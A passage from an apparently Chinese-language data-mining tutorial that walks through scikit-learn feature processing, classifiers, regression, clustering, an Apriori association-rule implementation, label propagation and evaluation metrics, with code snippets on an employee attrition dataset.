class="line"># 4. 特征处理</span><br><span class="line"># 连续值</span><br><span class="line">scaler_list = [False, False, False, False, False, False, False]</span><br><span class="line">col_list = [&#x27;satisfaction_level&#x27;, &#x27;last_evaluation&#x27;, &#x27;number_project&#x27;, &#x27;average_monthly_hours&#x27;, </span><br><span class="line">            &#x27;time_spend_company&#x27;, &#x27;Work_accident&#x27;, &#x27;promotion_last_5years&#x27;]</span><br><span class="line">for i, scaler in enumerate(scaler_list):</span><br><span class="line">    if not scaler: </span><br><span class="line">        df[col_list[i]] = MinMaxScaler().fit_transform(df[col_list[i]].values.reshape(-1, 1)).reshape(1, -1)[0]</span><br><span class="line">    else:</span><br><span class="line">        df[col_list[i]] = StandardScaler().fit_transform(df[col_list[i]].values.reshape(-1, 1)).reshape(1, -1)[0]</span><br><span class="line"># 离散值</span><br><span class="line">scaler_list = [True, False]</span><br><span class="line">col_list = [&#x27;department&#x27;, &#x27;salary&#x27;]</span><br><span class="line">salary_map = &#123;&#x27;low&#x27;: 0, &#x27;medium&#x27;: 1, &#x27;high&#x27;: 2&#125;</span><br><span class="line">for i, scaler in enumerate(scaler_list):</span><br><span class="line">    if not scaler: </span><br><span class="line">        if col_list[i] == &#x27;salary&#x27;: df[col_list[i]] = [salary_map[s] for s in df[&#x27;salary&#x27;].values]</span><br><span class="line">        else: df[col_list[i]] = LabelEncoder().fit_transform(df[col_list[i]])</span><br><span class="line">        df[col_list[i]] = MinMaxScaler().fit_transform(df[col_list[i]].values.reshape(-1, 1)).reshape(1, -1)[0]</span><br><span class="line">    else:</span><br><span class="line">        df = pd.get_dummies(df, columns=[col_list[i]]) # One Hot </span><br><span class="line"># 降维</span><br><span class="line">lower_d = False</span><br><span class="line">lower_d_n = 3</span><br><span class="line">if lower_d: df = PCA(n_components=lower_d_n).fit_transform(df.values)</span><br></pre></td></tr></table></figure>

<h3 id="挖掘建模"><a href="#挖掘建模" class="headerlink" title="挖掘建模"></a>挖掘建模</h3><p>数据集</p>
<ul>
<li>训练集 60% </li>
<li>验证集 20% ：多次训练验证得到参数最优的模型</li>
<li>测试集 20% ：评价模型的泛化能力</li>
</ul>
<p>切分数据集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">fv = df.values</span><br><span class="line">lv = label.values</span><br><span class="line">xtt, xvalid, ytt, yvalid = train_test_split(fv, lv, test_size=0.2) # 验证集  其他</span><br><span class="line">xtrain, xtest, ytrain, ytest = train_test_split(xtt, ytt, test_size=0.25) # 测试集  训练集</span><br></pre></td></tr></table></figure>

<p>存取模型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.externals import joblib</span><br><span class="line">joblib.dump(knnc, &#x27;knnc&#x27;)</span><br><span class="line">knnc = joblic.load(&#x27;knnc&#x27;)</span><br></pre></td></tr></table></figure>

<p>分类：</p>
<ul>
<li>KNN：<ul>
<li>距离：欧氏距离，曼哈顿距离，闵可夫斯基距离</li>
<li>KD 树：快速寻找最近点。</li>
<li>算法思想：找一个点最近的N个邻居，在N个邻居中和哪类最像就是哪类</li>
</ul>
</li>
<li>朴素贝叶斯：<ul>
<li>朴素：特征之间是相互独立的</li>
<li>拉普拉斯平滑：0 和 1 需要被平滑，否则无法比较。（加一或减一）</li>
<li>GaussianNB - 特征符合正态分布 - MultinomialNB - 特征为离散值 - BernoulliNB - 特征为二值化离散值</li>
<li>生成模型：先求出输入与输出的联合概率分布，再求类别归类的概率。朴素贝叶斯</li>
<li>判别模型：直接得到输出时对应的最大分类的概率。</li>
</ul>
</li>
<li>决策树：每次根据信息增益最大的切分<ul>
<li>连续值需要切分</li>
<li>规则用尽，特征用完：采用投票方式，多次使用特征</li>
<li>过拟合：剪枝</li>
</ul>
</li>
<li>支持向量机<ul>
<li>min L&#x3D;(w^2)&#x2F;2 st. y(wx+b) &gt;&#x3D; 1</li>
<li>如果出现异常点， min(max(L))</li>
<li>扩维：核函数</li>
</ul>
</li>
<li>集成方法：弱可学习分类器集合<ul>
<li>强可学习：多项式复杂度，效果明显</li>
<li>弱可学习：多项式复杂度，效果不明显</li>
<li>袋装法（并行）：多个模型投票（均值）<ul>
<li>随机森林：确定树的数量，每棵树用到的特征数，树的训练集</li>
<li>不需要剪枝防止过拟合</li>
</ul>
</li>
<li>提升法（串行）：多个模型串联，所有模型加权求和得到结果<ul>
<li>Adaboost：精度高，灵活调控，不用担心过拟合，简化特征工程流程</li>
</ul>
</li>
</ul>
</li>
<li>Logistic 映射 </li>
<li>人工神经网络</li>
</ul>
<p>KNN</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.neighbors import NearestNeighbors, KNeighborsClassifier</span><br><span class="line"># NearestNeighbors</span><br><span class="line">samples = [[0, 0, 2], [1, 0, 0], [0, 0, 1]]</span><br><span class="line">neigh = NearestNeighbors(n_neighbors=2, radius=0.4) #  邻居的数量为 2</span><br><span class="line">neigh.fit(samples)</span><br><span class="line">neigh.kneighbors([[0, 0, 1.3]], 2, return_distance=False)  # 获得最近2个点的索引</span><br><span class="line"># KNeighborsClassifier</span><br><span class="line">x = [[0], [1], [2], [3]]</span><br><span class="line">y = [0, 0, 1, 1]</span><br><span class="line">neigh = KNeighborsClassifier(n_neighbors=3)</span><br><span class="line">neigh.fit(x, y)</span><br><span class="line">neigh.predict([[1.1]])</span><br><span class="line"></span><br><span class="line"># 本文数据集测试</span><br><span class="line"># 引入评价指标</span><br><span class="line">from sklearn.metrics import accuracy_score, recall_score, f1_score</span><br><span class="line">knnc = KNeighborsClassifier(n_neighbors=5)</span><br><span class="line">knnc.fit(xtrain, ytrain)</span><br><span class="line">ypred = knnc.predict(xvalid)</span><br><span class="line">print(f&#x27;acc:&#123;accuracy_score(yvalid, ypred)&#125;, rec:&#123;recall_score(yvalid, ypred)&#125;, f1:&#123;f1_score(yvalid, ypred)&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>朴素贝叶斯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.naive_bayes import BernoulliNB  # 特征是离散二值化的</span><br><span class="line">from sklearn.naive_bayes import GaussianNB   # 特征符合高斯分布</span><br><span class="line">models = [</span><br><span class="line">    (&#x27;KNN&#x27;, KNeighborsClassifier(n_neighbors=3)),</span><br><span class="line">    (&#x27;GaussianNB&#x27;, GaussianNB()),</span><br><span class="line">    (&#x27;BernoulliNB&#x27;, BernoulliNB())</span><br><span class="line">]</span><br><span class="line">for clname, cl in models:</span><br><span class="line">    cl.fit(xtrain, ytrain)</span><br><span class="line">    xy = [(xtrain, ytrain), (xvalid, yvalid), (xtest, ytest)]</span><br><span class="line">    for i in range(len(xy)):</span><br><span class="line">        xp = xy[i][0]</span><br><span class="line">        yp = xy[i][1]</span><br><span class="line">        ypred = cl.predict(xp)</span><br><span class="line">        print(f&#x27;&#123;clname&#125;, &#123;i&#125;: acc:&#123;accuracy_score(yp, ypred)&#125;, rec:&#123;recall_score(yp, ypred)&#125;, f1:&#123;f1_score(yp, ypred)&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>决策树</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.tree import DecisionTreeClassifier</span><br><span class="line">models = [</span><br><span class="line">    # 参数：max_depth, min_samples_split</span><br><span class="line">    (&#x27;DecisionTreeGini&#x27;, DecisionTreeClassifier()),</span><br><span class="line">    (&#x27;DecisionTreeEntropy&#x27;, DecisionTreeClassifier(criterion=&quot;entropy&quot;)),</span><br><span class="line">]</span><br><span class="line">for clname, cl in models:</span><br><span class="line">    cl.fit(xtrain, ytrain)</span><br><span class="line">    xy = [(xtrain, ytrain), (xvalid, yvalid), (xtest, ytest)]</span><br><span class="line">    for i in range(len(xy)):</span><br><span class="line">        xp = xy[i][0]</span><br><span class="line">        yp = xy[i][1]</span><br><span class="line">        ypred = cl.predict(xp)</span><br><span class="line">        print(f&#x27;&#123;clname&#125;, &#123;i&#125;: acc:&#123;accuracy_score(yp, ypred)&#125;, rec:&#123;recall_score(yp, ypred)&#125;, f1:&#123;f1_score(yp, ypred)&#125;&#x27;)</span><br><span class="line"># 绘制决策树 Graphviz 要安装并添加到环境变量中</span><br><span class="line">import pydotplus</span><br><span class="line">from sklearn.externals.six import StringIO</span><br><span class="line">from sklearn.tree import export_graphviz</span><br><span class="line">dot_data = export_graphviz(</span><br><span class="line">    cl, </span><br><span class="line">    out_file=None, </span><br><span class="line">    feature_names=features.columns.values, </span><br><span class="line">    class_names=[&#x27;NotLeft&#x27;, &#x27;Left&#x27;], </span><br><span class="line">    fill=True, </span><br><span class="line">    rounded=True, </span><br><span class="line">    special_characters=True</span><br><span class="line">)</span><br><span class="line">graph = pydotplus.graph_from_dot_data(dot_data)</span><br><span class="line">graph.write_pdf(&#x27;dt.pdf&#x27;)</span><br></pre></td></tr></table></figure>

<p>支持向量机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.svm import SVC</span><br><span class="line">models = [</span><br><span class="line">    # C 精度，错分点惩罚度</span><br><span class="line">    (&quot;SVC&quot;, SVC(C=1)), </span><br><span class="line">]</span><br><span class="line">for clname, cl in models:</span><br><span class="line">    cl.fit(xtrain, ytrain)</span><br><span class="line">    xy = [(xtrain, ytrain), (xvalid, yvalid), (xtest, ytest)]</span><br><span class="line">    for i in range(len(xy)):</span><br><span class="line">        xp = xy[i][0]</span><br><span class="line">        yp = xy[i][1]</span><br><span class="line">        ypred = cl.predict(xp)</span><br><span class="line">        print(f&#x27;&#123;clname&#125;, &#123;i&#125;: acc:&#123;accuracy_score(yp, ypred)&#125;, rec:&#123;recall_score(yp, ypred)&#125;, f1:&#123;f1_score(yp, ypred)&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>随机森林与Adaboost</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.ensemble import RandomForestClassifier, AdaBoostClassifier</span><br><span class="line">from sklearn.svm import SVC</span><br><span class="line">models = [</span><br><span class="line">    # N_estimators 决策树个数，criterion 使用方法，max_features 特征数</span><br><span class="line">    # 最大深度，是否有放回采样 ...</span><br><span class="line">    (&quot;RandomForest&quot;, RandomForestClassifier()),</span><br><span class="line">    # 级联分类器数量，学习率，</span><br><span class="line">    (&quot;AdaBoost&quot;, AdaBoostClassifier()),</span><br><span class="line">]</span><br><span class="line">for clname, cl in models:</span><br><span class="line">    cl.fit(xtrain, ytrain)</span><br><span class="line">    xy = [(xtrain, ytrain), (xvalid, yvalid), (xtest, ytest)]</span><br><span class="line">    for i in range(len(xy)):</span><br><span class="line">        xp = xy[i][0]</span><br><span class="line">        yp = xy[i][1]</span><br><span class="line">        ypred = cl.predict(xp)</span><br><span class="line">        print(f&#x27;&#123;clname&#125;, &#123;i&#125;: acc:&#123;accuracy_score(yp, ypred)&#125;, rec:&#123;recall_score(yp, ypred)&#125;, f1:&#123;f1_score(yp, ypred)&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>回归</p>
<ul>
<li>线性回归：H(X) &#x3D; w * X<ul>
<li>最小二乘法</li>
<li>梯度下降法</li>
<li>正则化<ul>
<li>岭回归</li>
<li>Lasso回归</li>
<li>弹性回归</li>
</ul>
</li>
</ul>
</li>
<li>决策树</li>
<li>支持向量机</li>
<li>集成方法</li>
<li>Logistic 回归：一般用作分类器</li>
<li>人工神经网络<ul>
<li>感知器的串并联</li>
<li>输入层：输入范围[0, 1]</li>
<li>输出层：one-hot</li>
<li>激活函数：sigmod relu tanh softplus</li>
<li>反向传播算法</li>
<li>随机梯度下降：容易陷入最优解</li>
<li>问题<ul>
<li>易受离群点影像，容易过拟合：需要正则化、dropout</li>
<li>结果要 softmax 转化（结果的和为 1）</li>
</ul>
</li>
</ul>
</li>
<li>回归树与提升树<ul>
<li>GBDT 梯度提升决策树：泛化能力强</li>
<li>XgBoost ：支持并行计算</li>
</ul>
</li>
</ul>
<p>线性回归</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.linear_model import LinearRegression, Ridge, Lasso</span><br><span class="line">from sklearn.metrics import mean_squared_error</span><br><span class="line">features = df[[&#x27;number_project&#x27;, &#x27;average_monthly_hours&#x27;]]</span><br><span class="line">label = df[&#x27;last_evaluation&#x27;]</span><br><span class="line">regr = Ridge(alpha=0.6)</span><br><span class="line">regr = Lasso(alpha=0.002)</span><br><span class="line">regr = LinearRegression()</span><br><span class="line">regr.fit(features.values, label.values)</span><br><span class="line">Y_pred = regr.predict(features.values)</span><br><span class="line">print(regr.coef_, mean_squared_error(Y_pred, label.values))</span><br></pre></td></tr></table></figure>

<p>Logistic 回归 线性回归</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.linear_model import LogisticRegression</span><br><span class="line">from sklearn.metrics import mean_squared_error</span><br><span class="line">features = df[[&#x27;number_project&#x27;, &#x27;average_monthly_hours&#x27;]]</span><br><span class="line">label = df[&#x27;last_evaluation&#x27;]</span><br><span class="line"></span><br><span class="line">models = [</span><br><span class="line">    # penalty 正则化 C 正则化因子 tol 精度 solver 方法 </span><br><span class="line">    # 迭代次数 </span><br><span class="line">    (&quot;LogisticRegression&quot;, LogisticRegression()),</span><br><span class="line">]</span><br><span class="line">for clname, cl in models:</span><br><span class="line">    cl.fit(xtrain, ytrain)</span><br><span class="line">    xy = [(xtrain, ytrain), (xvalid, yvalid), (xtest, ytest)]</span><br><span class="line">    for i in range(len(xy)):</span><br><span class="line">        xp = xy[i][0]</span><br><span class="line">        yp = xy[i][1]</span><br><span class="line">        ypred = cl.predict(xp)</span><br><span class="line">        print(f&#x27;&#123;clname&#125;, &#123;i&#125;: acc:&#123;accuracy_score(yp, ypred)&#125;, rec:&#123;recall_score(yp, ypred)&#125;, f1:&#123;f1_score(yp, ypred)&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>人工神经网络</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># PyBrain 反向传播算法包</span><br><span class="line"># Keras</span><br><span class="line">from keras.models import Sequential</span><br><span class="line">from keras.layers.core import Dense, Activation</span><br><span class="line">from keras.optimizers import SGD</span><br><span class="line">model = Sequential() # 神经网络序列</span><br><span class="line">model.add(Dense(50, input_dim=len(f_v[0])))  # 加入稠密层（参数：输出维度，输入维度），也可以是卷积层</span><br><span class="line">model.add(Activation(&#x27;sigmoid&#x27;))</span><br><span class="line">model.add(Dense(2))  # 此处可省略输入层维度</span><br><span class="line">model.add(Activation(&#x27;softmax&#x27;))</span><br><span class="line">sgd = SGD(lr=0.1)</span><br><span class="line">model.compile(loss=&#x27;mean_squared_error&#x27;, optimizer=sgd)  #optimizer=&#x27;adam&#x27;</span><br><span class="line">model.fit(</span><br><span class="line">    xtrain, </span><br><span class="line">    np.array([[0, 1] if i == 1 else [1, 0] for i in ytrain]), </span><br><span class="line">    nb_epoch=100, </span><br><span class="line">    batch_size=8999)</span><br><span class="line">xy = [(xtrain, ytrain), (xvalid, yvalid), (xtest, ytest)]</span><br><span class="line">for i in range(len(xy)):</span><br><span class="line">    x = xy[i][0]</span><br><span class="line">    y = xy[i][1]</span><br><span class="line">    ypred = model.predict_classes(x)</span><br><span class="line">    print(f&#x27;NN, &#123;i&#125;: acc:&#123;accuracy_score(yp, ypred)&#125;, rec:&#123;recall_score(yp, ypred)&#125;, f1:&#123;f1_score(yp, ypred)&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>回归树与提升树</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from sklearn.ensemble import GradientBoostingClassifier</span><br><span class="line">models = [</span><br><span class="line">    # penalty 正则化 C 正则化因子 tol 精度 solver 方法 </span><br><span class="line">    # 迭代次数 </span><br><span class="line">    (&quot;GBDT&quot;, GradientBoostingClassifier(max_depth=6, n_estimators=100)),</span><br><span class="line">]</span><br><span class="line">for clname, cl in models:</span><br><span class="line">    cl.fit(xtrain, ytrain)</span><br><span class="line">    xy = [(xtrain, ytrain), (xvalid, yvalid), (xtest, ytest)]</span><br><span class="line">    for i in range(len(xy)):</span><br><span class="line">        xp = xy[i][0]</span><br><span class="line">        yp = xy[i][1]</span><br><span class="line">        ypred = cl.predict(xp)</span><br><span class="line">        print(f&#x27;&#123;clname&#125;, &#123;i&#125;: acc:&#123;accuracy_score(yp, ypred)&#125;, rec:&#123;recall_score(yp, ypred)&#125;, f1:&#123;f1_score(yp, ypred)&#125;&#x27;)</span><br></pre></td></tr></table></figure>

<p>聚类</p>
<ul>
<li>Kmeans<ul>
<li>初试：随机选取N个中心</li>
<li>中心：取数据的均值</li>
<li>距离：欧氏距离</li>
<li>问题<ul>
<li>初始中心影像：多随机选几次</li>
<li>离群点：K-Medoids</li>
<li>K的确定：轮廓系数</li>
</ul>
</li>
</ul>
</li>
<li>DBSCAN<ul>
<li>E 邻域</li>
<li>核心对象</li>
<li>直接密度可达</li>
<li>密度可达</li>
<li>密度相连</li>
<li>问题<ul>
<li>离群点不敏感</li>
<li>需要KD-Tree辅助</li>
</ul>
</li>
</ul>
</li>
<li>层次聚类<ul>
<li>每次连接距离最近的点</li>
<li>簇间距离：最短距离，最长距离，平均距离，Ward</li>
<li>聚类灵活</li>
<li>计算复杂度高</li>
<li>离群点影像大</li>
</ul>
</li>
<li>图分裂<ul>
<li>形成连通图，再逐一分裂</li>
<li>承受系数</li>
<li>分裂阈值</li>
<li>自顶向下的算法</li>
<li>图的建立方式、分裂方式可以非常灵活</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from sklearn.datasets import make_circles, make_blobs, make_moons</span><br><span class="line">from sklearn.cluster import KMeans, DBSCAN, AgglomerativeClustering</span><br><span class="line"></span><br><span class="line">n_samples = 1000</span><br><span class="line">circles = make_circles(n_samples=n_samples, factor=0.5, noise=0.05) # factor 内外圆间距</span><br><span class="line">moons = make_moons(n_samples=n_samples, noise=0.05)</span><br><span class="line">blobs = make_blobs(n_samples=n_samples, randon_state=1, noise=0.05, center_box=(-1, 1), cluster_std=0.1)</span><br><span class="line">random_data = np.random.rand(n_samples, 2)</span><br><span class="line">colors = &#x27;bgrcmyk&#x27;</span><br><span class="line">data = [circles, moons, blobs, random_data]</span><br><span class="line"></span><br><span class="line">models = [</span><br><span class="line">    (&#x27;None&#x27;, None),</span><br><span class="line">    # Kmeans</span><br><span class="line">    (&#x27;Kmeans&#x27;, KMeans(n_clusters=2)),</span><br><span class="line">    # DBSCAN</span><br><span class="line">    (&#x27;DBSCAN&#x27;, DBSCAN(min_samples=3, eps=0.2)),</span><br><span class="line">    # Agglomerative</span><br><span class="line">    (&#x27;Agglomerative&#x27;, AgglomerativeClustering(n_clusters=3, linkage=&#x27;ward&#x27;)),</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">f = plt.figure()</span><br><span class="line">for inx, clt in enumerate(models):</span><br><span class="line">    clname, clt = clt</span><br><span class="line">    for i, dataset in enumerate(data):</span><br><span class="line">        X, Y = dataset</span><br><span class="line">        if not clt: clt_res = [0 for item in range(len(X))]</span><br><span class="line">        else: </span><br><span class="line">            clt.fit(X)</span><br><span class="line">            clt_res = clt.labels_.astype(np.int)</span><br><span class="line">        f.add_subplot(len(models), len(data), inx * len(data) + i + 1)</span><br><span class="line">        [plt.scatter(X[p, 0], X[p, 1], color=colors[clt_res[p]]) for p in range(len(X))]</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>关联规则：反映一个事物与其他事物之间的关联性和相互依存性</p>
<ul>
<li>项目：一个物品</li>
<li>事务：一次交易种的一个物品清单</li>
<li>项集：若干个项目的集合（一次事务中的）</li>
<li>频繁项集：包含某些固定项目频繁出现</li>
<li>支持度：项集在总项集中出现的概率</li>
<li>置信度：<code>X</code>发生的情况下，由<code>(X-&gt;Y)</code>中推出<code>Y</code>的概率</li>
<li>提升度：<code>(X-&gt;Y)</code>置信度 <code>/</code> <code>Y</code>支持度<ul>
<li><code>&lt; 1</code> 相斥</li>
<li><code>&gt; 1</code> 提升</li>
</ul>
</li>
<li>Apriori算法：求取频繁项集</li>
<li>序列规则<ul>
<li>Apriori-All<ul>
<li>AprBlk AprLayer AprNode</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from itertools import combinations</span><br><span class="line">def comb(lst):</span><br><span class="line">    ret=[]</span><br><span class="line">    for i in range(1,len(lst)+1):</span><br><span class="line">        ret+=list(combinations(lst,i))</span><br><span class="line">    return ret</span><br><span class="line">class AprLayer(object):</span><br><span class="line">    d=dict()</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.d=dict()</span><br><span class="line">class AprNode(object):</span><br><span class="line">    def __init__(self,node):</span><br><span class="line">        self.s=set(node)</span><br><span class="line">        self.size=len(self.s)</span><br><span class="line">        self.lnk_nodes=dict()</span><br><span class="line">        self.num=0</span><br><span class="line">    def __hash__(self):</span><br><span class="line">        return hash(&quot;__&quot;.join(sorted([str(itm) for itm in list(self.s)])))</span><br><span class="line">    def __eq__(self, other):</span><br><span class="line">        if &quot;__&quot;.join(sorted([str(itm) for itm in list(self.s)]))==&quot;__&quot;.join(sorted([str(itm) for itm in list(other.s)])):</span><br><span class="line">            return True</span><br><span class="line">        return False</span><br><span class="line">    def isSubnode(self,node):</span><br><span class="line">        return self.s.issubset(node.s)</span><br><span class="line">    def incNum(self,num=1):</span><br><span class="line">        self.num+=num</span><br><span class="line">    def addLnk(self,node):</span><br><span class="line">        self.lnk_nodes[node]=node.s</span><br><span class="line"></span><br><span class="line">class AprBlk():</span><br><span class="line">    def __init__(self,data):</span><br><span class="line">        cnt=0</span><br><span class="line">        self.apr_layers = dict()</span><br><span class="line">        self.data_num=len(data)</span><br><span class="line">        for datum in data:</span><br><span class="line">            cnt+=1</span><br><span class="line">            datum=comb(datum)</span><br><span class="line">            nodes=[AprNode(da) for da in datum]</span><br><span class="line">            for node in nodes:</span><br><span class="line">                if not node.size in self.apr_layers:</span><br><span class="line">                    self.apr_layers[node.size]=AprLayer()</span><br><span class="line">                if not node in self.apr_layers[node.size].d:</span><br><span class="line">                    self.apr_layers[node.size].d[node]=node</span><br><span class="line">                self.apr_layers[node.size].d[node].incNum()</span><br><span class="line">            for node in nodes:</span><br><span class="line">                if node.size==1:</span><br><span class="line">                    continue</span><br><span class="line">                for sn in node.s:</span><br><span class="line">                    sub_n=AprNode(node.s-set([sn]))</span><br><span class="line">                    self.apr_layers[node.size-1].d[sub_n].addLnk(node)</span><br><span class="line"></span><br><span class="line">    def getFreqItems(self,thd=1,hd=1):</span><br><span class="line">        freq_items=[]</span><br><span class="line">        for layer in self.apr_layers:</span><br><span class="line">            for node in self.apr_layers[layer].d:</span><br><span class="line">                if self.apr_layers[layer].d[node].num&lt;thd:</span><br><span class="line">                    continue</span><br><span class="line">                freq_items.append((self.apr_layers[layer].d[node].s,self.apr_layers[layer].d[node].num))</span><br><span class="line">        freq_items.sort(key=lambda x:x[1],reverse = True)</span><br><span class="line">        return freq_items[:hd]</span><br><span class="line"></span><br><span class="line">    def getConf(self,low=True, h_thd=10, l_thd=1, hd=1):</span><br><span class="line">        confidence = []</span><br><span class="line">        for layer in self.apr_layers:</span><br><span class="line">            for node in self.apr_layers[layer].d:</span><br><span class="line">                if self.apr_layers[layer].d[node].num &lt; h_thd:</span><br><span class="line">                    continue</span><br><span class="line">                for lnk_node in node.lnk_nodes:</span><br><span class="line">                    if lnk_node.num &lt; l_thd:</span><br><span class="line">                        continue</span><br><span class="line">                    conf = float(lnk_node.num) / float(node.num)</span><br><span class="line">                    confidence.append([node.s, node.num, lnk_node.s, lnk_node.num, conf])</span><br><span class="line"></span><br><span class="line">        confidence.sort(key=lambda x: x[4])</span><br><span class="line">        if low:</span><br><span class="line">            return confidence[:hd]</span><br><span class="line">        else:</span><br><span class="line">            return confidence[-hd::-1]</span><br><span class="line"></span><br><span class="line">class AssctAnaClass():</span><br><span class="line">    def fit(self,data):</span><br><span class="line">        self.apr_blk=AprBlk(data)</span><br><span class="line">        return self</span><br><span class="line">    def get_freq(self,thd=1,hd=1):</span><br><span class="line">        return self.apr_blk.getFreqItems(thd=thd,hd=hd)</span><br><span class="line">    def get_conf_high(self,thd,h_thd=10):</span><br><span class="line">        return self.apr_blk.getConf(low=False, h_thd=h_thd, l_thd=thd)</span><br><span class="line">    def get_conf_low(self,thd,hd,l_thd=1):</span><br><span class="line">        return self.apr_blk.getConf(h_thd=thd,l_thd=l_thd,hd=hd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    data=[</span><br><span class="line">        [&quot;牛奶&quot;,&quot;啤酒&quot;,&quot;尿布&quot;],</span><br><span class="line">        [&quot;牛奶&quot;,&quot;啤酒&quot;,&quot;咖啡&quot;,&quot;尿布&quot;],</span><br><span class="line">        [&quot;香肠&quot;,&quot;牛奶&quot;,&quot;饼干&quot;],</span><br><span class="line">        [&quot;尿布&quot;,&quot;果汁&quot;,&quot;啤酒&quot;],</span><br><span class="line">        [&quot;钉子&quot;,&quot;啤酒&quot;],</span><br><span class="line">        [&quot;尿布&quot;,&quot;毛巾&quot;,&quot;香肠&quot;],</span><br><span class="line">        [&quot;啤酒&quot;,&quot;毛巾&quot;,&quot;尿布&quot;,&quot;饼干&quot;]</span><br><span class="line">    ]</span><br><span class="line">    print(&quot;Freq&quot;,AssctAnaClass().fit(data).get_freq(thd=3,hd=10))</span><br><span class="line">    print(&quot;Conf&quot;,AssctAnaClass().fit(data).get_conf_high(thd=3,h_thd=3))</span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    main()     </span><br></pre></td></tr></table></figure>

<p>半监督学习</p>
<ul>
<li>生成模型</li>
<li>判别模型<ul>
<li>标签传播算法：与已标注的样本相似度高的标为同一个标签<ul>
<li>RBF 相似度</li>
<li>KNN 相似度</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>标签传播算法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from sklearn import datasets</span><br><span class="line"></span><br><span class="line">iris=datasets.load_iris()</span><br><span class="line">labels=np.copy(iris.target)</span><br><span class="line">random_unlabeled_points=np.random.rand(len(iris.target))</span><br><span class="line">random_unlabeled_points=random_unlabeled_points&lt;0.7</span><br><span class="line">Y=labels[random_unlabeled_points]</span><br><span class="line">labels[random_unlabeled_points]=-1</span><br><span class="line">print(&quot;Unlabeled Number:&quot;,list(labels).count(-1))</span><br><span class="line"></span><br><span class="line">from sklearn.semi_supervised import LabelPropagation</span><br><span class="line">label_prop_model=LabelPropagation()</span><br><span class="line">label_prop_model.fit(iris.data,labels)</span><br><span class="line">Y_pred=label_prop_model.predict(iris.data)</span><br><span class="line">Y_pred=Y_pred[random_unlabeled_points]</span><br><span class="line">from sklearn.metrics import accuracy_score,recall_score,f1_score</span><br><span class="line">print(&quot;ACC:&quot;,accuracy_score(Y,Y_pred))</span><br><span class="line">print(&quot;REC:&quot;,recall_score(Y,Y_pred,average=&quot;micro&quot;))</span><br><span class="line">print(&quot;F-Score&quot;,f1_score(Y,Y_pred,average=&quot;micro&quot;))</span><br></pre></td></tr></table></figure>

<h3 id="模型评估"><a href="#模型评估" class="headerlink" title="模型评估"></a>模型评估</h3><p>分类模型：</p>
<ul>
<li>二分类：比较模型的输出和真实标签<ul>
<li>Y_pred：输出为概率值，要经过阈值再二值化，得到正负类</li>
<li>混淆矩阵：TP，FN（漏），FP（错），TN<ul>
<li>TP[0, 0], FN[1, 0], FP[0, 1], TN[1, 1]</li>
<li>正对角线表示正确分类的部分</li>
<li>正确率：正对角线 &#x2F; 所有</li>
<li>召回率：TP &#x2F; 第一列 - 真实的正类中被认出的正类</li>
<li>F-分数：权衡召回率和准确率</li>
<li>查准率：TP &#x2F; 第一行 - 认出的正类中真正的正类</li>
<li>错误接受率</li>
<li>错误拒绝率</li>
</ul>
</li>
</ul>
</li>
<li>多分类：<ul>
<li>多元混淆矩阵：对角线上是分类正确的类</li>
<li>准确率：与二分类一致</li>
<li>召回率、F-分数：<ul>
<li>采用二分类方法</li>
<li>加权求平均</li>
</ul>
</li>
</ul>
</li>
<li>ROC<ul>
<li>横轴：FPR</li>
<li>纵轴：TPR - 召回率</li>
<li>阈值：尽量取图像拐点</li>
</ul>
</li>
<li>AUC<ul>
<li>ROC下的面积</li>
</ul>
</li>
<li>增益图<ul>
<li>横轴：测试集的比例</li>
<li>纵轴：正样本比例 &#x2F; 平均比例</li>
<li>反应分类器的分类效果</li>
</ul>
</li>
<li>KS图<ul>
<li>横轴：测试集的比例</li>
<li>纵轴：TPR与FPR</li>
<li>反应分类器的区分度</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">from sklearn.metrics import roc_curve, auc, roc_auc_score</span><br><span class="line">f = plt.figure()</span><br><span class="line">y_pred, y_test = np.array(Yp[:, 1]).reshape((1, -1)[0]), np.array(Ypt[:, 1]).reshape((1, -1)[0])</span><br><span class="line">f.add_subplot(1, 3, 1)</span><br><span class="line">fpr, tpr, threshold = roc_curve(y_test, y_pred)</span><br><span class="line">plt.plot(fpr, tpr)</span><br><span class="line">print(&#x27;AUC: &#x27;, auc(fpr, tpr))</span><br><span class="line">print(&#x27;AUC_SCORE: &#x27;, roc_auc_score(y_test, y_pred))</span><br></pre></td></tr></table></figure>

<p>回归模型</p>
<ul>
<li>MAE：残差绝对值的平均值，无法求导</li>
<li>MSE：均方差</li>
<li>RMSE：均方差的二次跟</li>
